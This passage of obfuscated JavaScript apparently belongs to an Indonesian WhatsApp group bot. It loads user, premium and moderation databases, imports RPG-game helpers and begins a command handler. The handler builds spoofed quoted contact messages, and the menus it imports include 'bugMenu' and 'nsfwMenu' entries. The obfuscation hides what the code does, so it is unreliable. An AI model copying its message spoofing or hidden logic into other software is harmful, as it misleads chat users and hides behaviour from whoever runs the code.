menginginkanku', '*🐘Elephant* : ', 'Sukses delete set proses', 'currentTurn', ' | ', '✅ Done set close!', 'application/', 'expired', 'toaudio', ' Halo Semuanya, group close dulu ya', '*Misi kill Demon*\x0a🎁 *Demon Kill Reward*\x0a ┊ *Money:* $', './datanya/anime/husbu', ' juna', '%)\x0a *• Free :* ', 'Sukses Change To Public Mode', 'CATALOG', './lib/setleft', 'transliteration', 'https://telegra.ph/file/efdcd7d07dd22294695a8.jpg', '*smoke (Text)*\x0a│50 ▸ ', 'smoke', 'Fitur Khusus Japri!', 'https://api.arifzyn.xyz/download/youtube?url=', 'jarak', 'coolg', 'https://api.zahwazein.xyz/randomasupan/cecan?apikey=', 'GrandLegends 4', 'Contoh:\x0a', 'Udah Mute', 'https://skizo.tech/api/igdl?url=', 'help', 'retrotext', '*Jumlah Batu dijual:* ', '#groupmenu', '╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *1*\x0a│2 ▸ *2*\x0a│3 ▸ *3*\x0a│4 ▸ *4*\x0a│5 ▸ *5*\x0a│6 ▸ *6*\x0a│7 ▸ *7*\x0a│8 ▸ *8*\x0a│9 ▸ *9*\x0a│10 ▸ *10*\x0a│11 ▸ *11*\x0a│12 ▸ *12*\x0a│13 ▸ *13*\x0a│14 ▸ *14*\x0a│15 ▸ *15*\x0a│16 ▸ *16*\x0a│17 ▸ *17*\x0a│18 ▸ *18*\x0a│19 ▸ *19*\x0a│20 ▸ *20*\x0a│21 ▸ *21*\x0a│22 ▸ *22*\x0a│23 ▸ *23*\x0a│24 ▸ *24*\x0a│25 ▸ *25*\x0a│26 ▸ *26*\x0a│\x0a╰────────────˧', 'downloadLink', '#listbahasa', 'rules', 'Punya kalimat sendiri & mau ditambahin? chat *.owner*', '.next', './datanya/anime/inori', 'arab', 'Belum ada set done di gc ini', './datanya/anime/shizuka', '10 Hari Lagi', 'createImage', 'killbehemoth', 'reverse', ' file sampah\x0a\x0a', 'tebaktebakan', 'fileSha256', '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781', 'glitter2', 'all', '@g.us', 'Sorry this video can\'t be download\x0a\x0aPlease try typing .ig3 *url*', 'Lu siapa kocak?', '\x0a*Chapter:* ', '\x0a\x0aTafsir Surah : ', 'resources', '&filter=', 'rainbow2', 'instagram', 'https://zeltoria.site/api/search/playstore?q=', 'serializeM', 'wonderfulg', 'participant', 'Sukses ubah set proses!', 'metalr', ' 𝙏𝙚𝙡𝙖𝙝 𝘿𝙞𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙆𝙚𝙙𝙖𝙡𝙖𝙢 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚', './datanya/truth-dare/dare', 'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai', 'tags', 'ytelo', 'masteryavatar', '#antilink2', 'alcakenya', ' detik', 'Reply Image', 'BotKey', '「 DEATH 」\x0a\x0a *┊ Place* ', 'glass4', 'Dalmerlington', '-filter:a \"atempo=0.7,asetrate=44100\"', 'join', 'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\x0a*BY PUTRI*', 'cekbandwidth', 'sellikan', 'sticker', ' @tag|30d', './lib/setproses', 'teamlogo', 'autorespond', 'mime', '\x0aFollowers : ', 'checkAfkUser', 'https://api.zeeoneofc.my.id/api/islam/randomquran?apikey=', '_*List User Yang Terbanned Di Database :*_ *', 'https://telegra.ph/file/43259a7d8accff8b627c0.jpg', 'instavid', 'setDefault', '*Misi kill Devil*\x0a\x0a🎁 *Hadiah untuk killing Devil*\x0a ┊ *Money:* $', 'keta', 'quotesdilan', 'https://api.zahwazein.xyz/islami/quran/audio/', 'username', 'Broughton', 'bcvid', 'Sukses mengaktifkan welcome di grup ini', './media/sound/toxic.mp3', 'kali', '*\x0a\x0a', './lib/stickerr', 'randomquran2', '\x0aID Zone: ', 'stats', 'twittergold', 'truth', '\x0a*Owner :* ', 'Teka Lirik', 'simivoice', '#nsfwmenu', 'jisoo', '*「 LINK FACEBOOK TERDETEKSI 」*\x0a\x0aTunggu sebentar, mendownload file...', 'balloon3', './media/podcast/3.mp3', 'Sukses Menambahkan Sticker\x0aCek dengan cara ', ' fish 2', 'Iya Kak?', ' / ', '*Penggunaan Salah Silahkan Gunakan Seperti Ini*\x0a', '3 Tahun Lagi', 'Keluar', 'Tak semudah itu melupakanmu', '\x0a*Lirik*: ', 'dashboard', 'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya', './database/openaipc.json', ' id|server', 'https://api.royalprinz.my.id/api/search/bukalapak?q=', '*metallicglow (Text)*\x0a│17 ▸ ', './datanya/anime/menus', 'promote', 'toimg', 'listblock', 'Tunggu Sebentar Audio Sedang Dikirim', ' 👑\x0a\x0aPemenangnya adalah [ @', 'Yellowseed', 'instareel', 'groupInviteCode', './media/sound/lopyou.mp3', 'https://api.zahwazein.xyz/randomtext/bucinquote?apikey=', 'sendContact', 'emerald', 'Susun Kata', 'Sedang berpetualang, silahkan tunggu...', 'tagall', 'openaiimg', 'addstik', 'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\x0a*BY PUTRI*', 'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa', 'bcaud', 'Contoh : ', '#welcome', '#delsetwelcome', 'fromMe', './datanya/anime/sakura', 'Gak Bisa Ajg Aaokawpk', '40 Bulan Lagi', 'smoke-typography', 'metalg', 'Sukses Broadcast', 'Couple Female', 'galaxywallpaper', './datanya/anime/megumin', '&apikey=', 'trakteer', './database/set_welcome.json', 'Skystead', 'Group WhatsApp', '*royallook (Text)*\x0a│9 ▸ ', 'pubgbirthday', '*Name:* ', 'Fitur Khusus admin!', ' Nya 😋', 'metalb', 'harga', 'log', 'https://skizo.tech/api/ttsearch?search=', 'Foolshope', 'left', '85 Hari Lagi', 'textpromenu', 'https://api.zeeoneofc.my.id/api/ephoto360/', 'horrorletter', '\x0a\x0aKirim perintah .tekatu untuk bantuan dan .ytekatu untuk menyerah 🎮', 'state', 'Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan', 'https://skizo.tech/api/tts-anime?text=', 'jawaban', './datanya/anime/hinata', '*white-cube (Text)*\x0a│27 ▸ ', 'newyear2', 'imgToSticker', 'Terimakasih', 'Accreton', 'listbannerofpubg', 'setwelcome', 'Awass', '\x0a*Harga:* ', 'isGroup', '\x0aTipe : ', 'channel', 'https://api.github.com/repos/', 'jungkook', '#buylimit', 'Group Akan Ditutup Dalam ', 'tiktokslide', 'Ini Adalah Lirik Dari Lagu? : *', 'searchgrup', 'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat'];
    _0x220e = function () {
        return _0x5b1768;
    };
    return _0x220e();
}
let setiker = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/stik.json')),
    audionye = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/vn.json')),
    imagenye = JSON[_0x2dea4c(0x370)](fs['readFileSync'](_0x2dea4c(0x375))),
    videonye = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0xb92))),
    set_welcome_db = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0xcc9))),
    set_left_db = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/set_left.json')),
    set_proses = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0xb0d))),
    set_done = JSON[_0x2dea4c(0x370)](fs['readFileSync'](_0x2dea4c(0x3be))),
    set_open = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x5f2))),
    set_close = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x3c9))),
    _afk = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/afk.json')),
    db_respon_list = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/list-message.json')),
    sewa = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x8cf))),
    opengc = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/opengc.json')),
    closegc = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x757))),
    _nsfw = JSON[_0x2dea4c(0x370)](fs['readFileSync'](_0x2dea4c(0x838))),
    pendaftar = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/user.json')),
    mess = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x46c))),
    premium = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x9c3))),
    balance = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0xa38))),
    limit = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x99e))),
    glimit = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0xc07))),
    kickme = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0x6c5))),
    mute = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x1f7))),
    antilink = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x312))),
    antiwame = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)]('./database/antiwame.json')),
    antilink2 = JSON[_0x2dea4c(0x370)](fs['readFileSync']('./database/antilink2.json')),
    antiwame2 = JSON['parse'](fs[_0x2dea4c(0x456)]('./database/antiwame2.json')),
    autodlgc = JSON[_0x2dea4c(0x370)](fs['readFileSync'](_0x2dea4c(0x4ef))),
    listCmd = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0x1ba))),
    _cmd = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0xa07))),
    _cmdUser = JSON['parse'](fs[_0x2dea4c(0x456)]('./database/commandUser.json')),
    modsNumber = JSON['parse'](fs['readFileSync'](_0x2dea4c(0x147))),
    responDB = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x760))),
    listStore = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x2b5))),
    _limit = JSON['parse'](fs['readFileSync']('./database/user/limit.json')),
    _buruan = JSON[_0x2dea4c(0x370)](fs['readFileSync'](_0x2dea4c(0x3f6))),
    _darahOrg = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x20b))),
    openaipc = JSON['parse'](fs['readFileSync'](_0x2dea4c(0xca1))),
    openaigc = JSON['parse'](fs[_0x2dea4c(0x456)](_0x2dea4c(0x477)));
const user_ban = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x443))),
    _petualang = JSON[_0x2dea4c(0x370)](fs[_0x2dea4c(0x456)](_0x2dea4c(0x983))),
    {
        addInventoriDarah,
        cekDuluJoinAdaApaKagaDiJson,
        addDarah,
        kurangDarah,
        getDarah
    } = require(_0x2dea4c(0xadd)),
    {
        cekInventoryAdaAtauGak
    } = require(_0x2dea4c(0x856)),
    {
        addInventoriMonay,
        cekDuluJoinAdaApaKagaMonaynyaDiJson,
        addMonay,
        kurangMonay,
        getMonay
    } = require(_0x2dea4c(0x213)),
    {
        addInventoriLimit,
        cekDuluJoinAdaApaKagaLimitnyaDiJson,
        addLimit,
        kurangLimit
    } = require('./database/user/limit.js'),
    {
        cekDuluHasilBuruanNya,
        addInventoriBuruan,
        addAyam,
        addKelinci,
        addDomba,
        addSapi,
        addGajah,
        kurangIkan,
        kurangAyam,
        kurangKelinci,
        kurangDomba,
        kurangSapi,
        kurangGajah,
        getIkan,
        getAyam,
        getKelinci,
        getDomba,
        getSapi,
        getGajah
    } = require(_0x2dea4c(0x523)),
    {
        getLevelingXp,
        getLevelingLevel,
        getLevelingId,
        addLevelingXp,
        addLevelingLevel,
        addLevelingId,
        addATM,
        addKoinUser,
        checkATMuser,
        addIkan,
        getMancingIkan,
        getMancingId,
        addMancingId,
        jualIkan,
        addPlanet,
        getBertualangPlanet,
        getPlaneId,
        addPlaneId,
        jualbahankimia,
        addCoal,
        getMiningcoal,
        getMiningId,
        addMiningId,
        jualcoal,
        addStone,
        getMiningstone,
        getBatuId,
        addBatuId,
        jualstone,
        addOre,
        getMiningore,
        getOreId,
        addOreId,
        jualore,
        addIngot,
        getMiningingot,
        getIngotId,
        addIngotId,
        jualingot,
        addKayu,
        getNebangKayu,
        getNebangId,
        addNebangId,
        jualKayu,
        checkPetualangUser,
        addInventori,
        sellBesi,
        addDm,
        sellDm,
        getDm,
        sellEmas,
        addFish,
        sellFish,
        getFish,
        addBesi,
        addEmas,
        addEmerald,
        addUmpan,
        addPotion,
        kurangBesi,
        kurangEmas,
        kurangEmerald,
        kurangUmpan,
        kurangPotion,
        getBesi,
        getEmas,
        getEmerald,
        getUmpan,
        getPotion
    } = require(_0x2dea4c(0x854));
let DarahAwal = 0x64;
const ikan = ['🐟', '🐠', '🐡'],
    enter = '\x0a';
let tictactoe = [],
    kuis = [];
const kuismath = {},
    _family100 = {},
    tebakgambar = {},
    tebakgame = {},
    tebakkata = {},
    tebakbendera = {},
    siapaaku = {},
    tebakkalimat = {},
    caklontong = {},
    susunkata = {},
    tekateki = {},
    tebakkabupaten = {},
    tebakkimia = {},
    tebaklirik = {},
    tebaktebakan = {};
setInterval(function () {
    const _0x221ff7 = _0x2dea4c;
    var _0x4cbb53 = new Date()['toLocaleTimeString'](_0x221ff7(0xab1), {
            'timeZone': 'Asia/Jakarta'
        }),
        _0x48803a = _0x4cbb53[_0x221ff7(0x4bd)](':')[0x0] < 0xa ? '0' + _0x4cbb53 : _0x4cbb53;
    _0x48803a === '12:00:00 AM' && (limit = [], fs['writeFileSync'](_0x221ff7(0x99e), JSON[_0x221ff7(0x736)](limit)), glimit = [], fs['writeFileSync'](_0x221ff7(0xc07), JSON[_0x221ff7(0x736)](glimit)), console[_0x221ff7(0xcd3)](_0x221ff7(0x82c)));
}, 0x3e8);
async function checkBandwidth() {
    const _0x5ba54e = _0x2dea4c;
    let _0x1b8d86 = 0x0,
        _0x30e8ba = 0x0;
    for (let _0x29b787 of await require(_0x5ba54e(0x1dd))['netstat'][_0x5ba54e(0xc8b)]()) {
        _0x1b8d86 += parseInt(_0x29b787[_0x5ba54e(0xb6c)]), _0x30e8ba += parseInt(_0x29b787['outputBytes']);
    }
    return {
        'download': format(_0x1b8d86),
        'upload': format(_0x30e8ba)
    };
}
moment['tz'][_0x2dea4c(0xc7c)]('Asia/Jakarta')['locale']('id'), module[_0x2dea4c(0x799)] = juna = async (_0x614da8, _0x1b1e88, _0xd612d5, _0x4d225b, _0x588c41, _0x932571, _0x5711f4, _0x3cfef1, _0x9626ee, _0x219d8b, _0x5f1af7, _0x59bdd0, _0x265bb0, _0x1609d1, _0x111617, _0x1faf73) => {
    const _0x5804c8 = _0x2dea4c;
    try {
        const {
            ownerNumber: _0x374470,
            instagram: _0x3b4ae4,
            gcwa: _0x10c563,
            ownerName: _0x33c99f,
            botName: _0x358b6e,
            footer: _0xc7fb84,
            pathimg: _0xfc3dc4,
            gamewaktu: _0xfb73a1,
            limitCount: _0x49d6b7
        } = _0x932571;
        var _0x3bcaa8 = _0x1b1e88[_0x5804c8(0x541)] === _0x5804c8(0x557) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0x557)] : _0x1b1e88[_0x5804c8(0x541)] == _0x5804c8(0x22d) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0x22d)][_0x5804c8(0xb63)] : _0x1b1e88[_0x5804c8(0x541)] == _0x5804c8(0xa62) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xa62)][_0x5804c8(0xb63)] : _0x1b1e88[_0x5804c8(0x541)] == _0x5804c8(0xd00) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xd00)]['text'] : _0x1b1e88[_0x5804c8(0x541)] == 'buttonsResponseMessage' ? _0x1b1e88['message']['buttonsResponseMessage']['selectedButtonId'] : _0x1b1e88['mtype'] == _0x5804c8(0xa41) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xa41)][_0x5804c8(0x48f)][_0x5804c8(0xd96)] : _0x1b1e88[_0x5804c8(0x541)] == _0x5804c8(0x132) ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0x132)][_0x5804c8(0xa75)] : _0x1b1e88[_0x5804c8(0x541)] == 'messageContextInfo' ? _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xab6)]?. [_0x5804c8(0x9cb)] || _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xa41)]?. [_0x5804c8(0x48f)][_0x5804c8(0xd96)] || _0x1b1e88[_0x5804c8(0x73c)] : '',
            _0x22c514 = typeof _0x1b1e88[_0x5804c8(0x73c)] == _0x5804c8(0x36a) ? _0x1b1e88['text'] : '';
        const _0x202db0 = JSON[_0x5804c8(0x736)](_0x4d225b[_0x5804c8(0x200)]),
            _0x527f19 = Object[_0x5804c8(0xafa)](_0x4d225b[_0x5804c8(0x200)])[0x0];
        if (_0x1b1e88 && _0x527f19 == _0x5804c8(0x6a7)) _0x614da8['ev']['emit'](_0x5804c8(0x420), _0x1b1e88[_0x5804c8(0x200)]['protocolMessage'][_0x5804c8(0x2a9)]);
        const _0x1117db = await _0x614da8['decodeJid'](_0x614da8['user']['id']),
            _0x7b6ab6 = [_0x1117db, ..._0x374470][_0x5804c8(0x686)](_0xf079ef => _0xf079ef[_0x5804c8(0xa72)](/[^0-9]/g, '') + '@s.whatsapp.net')[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]),
            _0x3b7c58 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/ [_0x5804c8(0xbaa)](_0x3bcaa8) ? _0x3bcaa8[_0x5804c8(0x98b)](/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.',
            _0x201454 = _0x3bcaa8[_0x5804c8(0xac2)](_0x3b7c58),
            _0x180c1e = _0x201454 ? _0x3bcaa8[_0x5804c8(0x7af)](0x1)[_0x5804c8(0xd5d)]()[_0x5804c8(0x4bd)](' ')[_0x5804c8(0x203)]()[_0x5804c8(0x7bb)]() : '',
            _0x453fc1 = _0x7b6ab6 ? _0x3bcaa8[_0x5804c8(0xa72)](_0x3b7c58, '')[_0x5804c8(0xd5d)]()[_0x5804c8(0x4bd)](/ +/)[_0x5804c8(0x203)]()['toLowerCase']() : _0x180c1e,
            _0x83eae5 = _0x3bcaa8[_0x5804c8(0xd5d)]()['split'](/ +/)[_0x5804c8(0x7af)](0x1),
            _0x32b235 = _0x1b1e88[_0x5804c8(0x243)] || _0x5804c8(0xa8c),
            _0x1d3938 = _0x1b1e88[_0x5804c8(0xd13)] == _0x1117db ? !![] : ![],
            _0x1b04cf = q = _0x83eae5[_0x5804c8(0xc6c)](' '),
            _0x8a4e1a = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)] : _0x1b1e88,
            _0x2b1d7d = (_0x8a4e1a[_0x5804c8(0x278)] || _0x8a4e1a)[_0x5804c8(0x235)] || '',
            _0x1afa47 = /image|video|sticker|audio/ [_0x5804c8(0xbaa)](_0x2b1d7d),
            {
                allMenu: _0x54b27e,
                simpleMenu: _0x4a1a0b,
                mainMenu: _0x5ebb4f,
                convertMenu: _0x745546,
                anonymousMenu: _0x2d1704,
                storeMenu: _0x55b4b7,
                rpgMenu: _0x54731b,
                gameMenu: _0x561d84,
                groupMenu: _0x85a4b7,
                downloadMenu: _0x47e012,
                searchMenu: _0x39c054,
                randomMenu: _0x48e947,
                randomAnime: _0x48c66e,
                randomQuotes: _0x5c3311,
                voiceChanger: _0xd7482,
                cewekMenu: _0x5b4190,
                cowokMenu: _0x1bd01a,
                balanceMenu: _0x4efc0a,
                ownerMenu: _0x13940a,
                storageMenu: _0x10b8bb,
                asupanMenu: _0x17ec3e,
                randomSticker: _0x44eb67,
                stalkingMenu: _0x2d5509,
                imageEffect: _0x1f74a2,
                funMenu: _0x3fdf07,
                islamMenu: _0x587632,
                bugMenu: _0xde2b29,
                nsfwMenu: _0x2646ec,
                textproMenu: _0x3e90e5,
                photooxyMenu: _0x3fad7f,
                ephotoMenu: _0x19e764,
                logoMenu: _0x3163df,
                donate: _0x297266
            } = require('./menu');
        let _0xec783b = '' + _0xc7fb84;
        const _0x4fb4a6 = moment(Date[_0x5804c8(0x7e5)]())['tz']('Asia/Jakarta')[_0x5804c8(0x3b2)]('id')['format'](_0x5804c8(0x24c)),
            _0x2d6392 = moment()['format'](_0x5804c8(0x24c));
        let _0x3ca311 = moment(Date[_0x5804c8(0x7e5)]())['tz'](_0x5804c8(0x8cb))[_0x5804c8(0x3b2)]('id')[_0x5804c8(0xb27)]('a');
        var _0x142c83 = _0x3ca311 == _0x5804c8(0xaf8) ? _0x3ca311 + '🌝' : _0x3ca311 == _0x5804c8(0xb75) ? _0x3ca311 + '🌞' : _0x3ca311 == 'sore' ? _0x3ca311 + '🌝' : _0x3ca311 + '🌚';
        const _0x2eeea8 = _0x142c83[_0x5804c8(0x68f)](0x0)[_0x5804c8(0xafb)]() + _0x142c83['slice'](0x1),
            _0x53b8b8 = _0x1b1e88[_0x5804c8(0xcea)] ? await _0x614da8['groupMetadata'](_0x1b1e88['chat'])[_0x5804c8(0xb9d)](_0x433fdc => {}) : '',
            _0x131b22 = _0x1b1e88['isGroup'] ? _0x53b8b8['subject'] : '',
            _0x3734ec = _0x1b1e88[_0x5804c8(0xcea)] ? _0x53b8b8[_0x5804c8(0x8d7)] : '',
            _0x29f094 = _0x1b1e88['isGroup'] ? await _0x53b8b8['participants'] : '',
            _0x239412 = _0x1b1e88[_0x5804c8(0xcea)] ? await getGroupAdmins(_0x29f094) : '',
            _0x2ab1a1 = _0x1b1e88[_0x5804c8(0xcea)] ? _0x239412[_0x5804c8(0x34b)](_0x1117db) : ![],
            _0x155c75 = _0x1b1e88[_0x5804c8(0xcea)] ? _0x239412[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) : ![],
            _0x50c0d9 = pendaftar[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]),
            _0x4343cd = user_ban[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]),
            _0x53a93f = checkPetualangUser(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x75f0ff = _0x7b6ab6 ? !![] : _prem[_0x5804c8(0x32b)](_0x1b1e88[_0x5804c8(0xd13)], premium),
            _0x585e2d = _sewa[_0x5804c8(0x9ca)](_0x1b1e88[_0x5804c8(0x60f)], sewa),
            _0x4ca01d = kickme['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x2e0069 = mute[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x227ca0 = antilink['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x327d5f = antilink2[_0x5804c8(0x34b)](_0x1b1e88['chat']) ? !![] : ![],
            _0x357365 = _0x111617[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x42bb25 = _0x1faf73['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x1e9068 = autodlgc['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x54303b = openaigc['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x139b1f = openaipc['includes'](_0x1117db) ? !![] : ![],
            _0x1edc83 = _0x265bb0[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x3b78a2 = _0x1609d1[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x1132dc = afk[_0x5804c8(0xc77)](_0x1b1e88[_0x5804c8(0xd13)], _afk),
            _0x4c18ee = _nsfw[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x49fc0c = antiwame['includes'](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0xffcce2 = antiwame2[_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x60f)]) ? !![] : ![],
            _0x266f28 = _0x932571[_0x5804c8(0x6d8)],
            _0x1efa36 = _0x75f0ff ? _0x266f28[_0x5804c8(0xd54)] : _0x266f28[_0x5804c8(0x610)];
        let _0xd80d98 = speed(),
            _0x1f916c = speed() - _0xd80d98;
        const _0x51e31f = {
                'key': {
                    'participant': '0@s.whatsapp.net',
                    ..._0x1b1e88[_0x5804c8(0x60f)] ? {
                        'remoteJid': _0x5804c8(0x623)
                    } : {}
                },
                'message': {
                    'contactMessage': {
                        'displayName': '' + _0x32b235,
                        'vcard': 'BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;' + _0x32b235 + _0x5804c8(0x5d5) + _0x32b235 + _0x5804c8(0x3f5) + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + ':' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x814),
                        'jpegThumbnail': _0xfc3dc4,
                        'thumbnail': _0xfc3dc4,
                        'sendEphemeral': !![]
                    }
                }
            },
            _0x1fc517 = {
                'key': {
                    'participant': '0@s.whatsapp.net',
                    ..._0x1b1e88[_0x5804c8(0x60f)] ? {
                        'remoteJid': _0x5804c8(0x1c7)
                    } : {}
                },
                'message': {
                    'contactMessage': {
                        'displayName': '' + _0x32b235,
                        'vcard': 'BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;' + _0x32b235 + ',;;;\x0aFN:' + _0x32b235 + _0x5804c8(0x3f5) + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + ':' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x814),
                        'jpegThumbnail': _0xfc3dc4,
                        'thumbnail': _0xfc3dc4,
                        'sendEphemeral': !![]
                    }
                }
            },
            _0x54eab5 = {
                'key': {
                    'participant': '0@s.whatsapp.net',
                    ..._0x1b1e88[_0x5804c8(0x60f)] ? {
                        'remoteJid': _0x5804c8(0x1c7)
                    } : {}
                },
                'message': {
                    'contactMessage': {
                        'displayName': _0x5804c8(0xbba),
                        'vcard': _0x5804c8(0x9fc) + _0x32b235 + _0x5804c8(0x5d5) + _0x32b235 + ',\x0aitem1.TEL;waid=' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + ':' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + '\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD',
                        'jpegThumbnail': _0xfc3dc4,
                        'thumbnail': _0xfc3dc4,
                        'sendEphemeral': !![]
                    }
                }
            },
            _0x5910d8 = await cekDuluJoinAdaApaKagaDiJson(_0x1b1e88[_0x5804c8(0x61e)]),
            _0x25893f = await getDarah(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x2efc03 = await getUmpan(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x5f3849 = await getPotion(_0x1b1e88['sender']),
            _0x4dddca = await getIkan(_0x1b1e88['sender']),
            _0x41cd7e = await getAyam(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x424e7e = await getKelinci(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x29294f = await getDomba(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x4bd207 = await getSapi(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x2e821f = await getGajah(_0x1b1e88['sender']),
            _0x56b113 = await getMonay(_0x1b1e88['sender']),
            _0x2ca47c = await getBesi(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x23773f = await getEmas(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x1fbd07 = await getEmerald(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x1e2c2a = await cekInventoryAdaAtauGak(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x494ebf = await cekDuluHasilBuruanNya(_0x1b1e88['sender']),
            _0x1825c3 = await cekDuluJoinAdaApaKagaLimitnyaDiJson(_0x1b1e88[_0x5804c8(0xd13)]),
            _0x440279 = await cekDuluJoinAdaApaKagaMonaynyaDiJson(_0x1b1e88['sender']);
        dbs['push']({
            'id': _0x1b1e88['key']['id'],
            'm': _0x1b1e88
        });
        const _0x32daaa = _0x55b266 => {
                const _0x314fff = _0x5804c8;
                return _0x55b266[_0x314fff(0x98b)]('@') ? [..._0x55b266[_0x314fff(0x5a2)](/@([0-9]{5,16}|0)/g)][_0x314fff(0x686)](_0x37e8d2 => _0x37e8d2[0x1] + _0x314fff(0x7cd)) : [];
            },
            _0x1b8a0b = (_0x50e5e9, _0x259ab2) => [{
                'buttonId': _0x50e5e9,
                'buttonText': {
                    'displayText': _0x259ab2
                },
                'type': 0x1
            }],
